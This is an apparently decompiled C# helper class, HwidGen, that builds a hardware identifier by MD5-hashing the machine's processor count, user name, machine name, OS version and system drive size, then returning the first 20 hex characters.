using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Client.Helper
{
	// Token: 0x02000011 RID: 17
	public static class HwidGen
	{
		// Token: 0x06000053 RID: 83 RVA: 0x00003D54 File Offset: 0x00001F54
		public static string HWID()
		{
			string result;
			try
			{
				string s = string.Concat(new object[]
				{
					Environment.ProcessorCount,
					Environment.UserName,
					Environment.MachineName,
					Environment.OSVersion,
					new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
				});
				HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
				byte[] array = Encoding.ASCII.GetBytes(s);
				array = hashAlgorithm.ComputeHash(array);
				StringBuilder stringBuilder = new StringBuilder();
				foreach (byte b in array)
				{
					stringBuilder.Append(b.ToString("x2"));
				}
				result = stringBuilder.ToString().Substring(0, 20).ToUpper();
			}
			catch
			{
				result = "Err HWID";
			}
			return result;
		}
	}
}
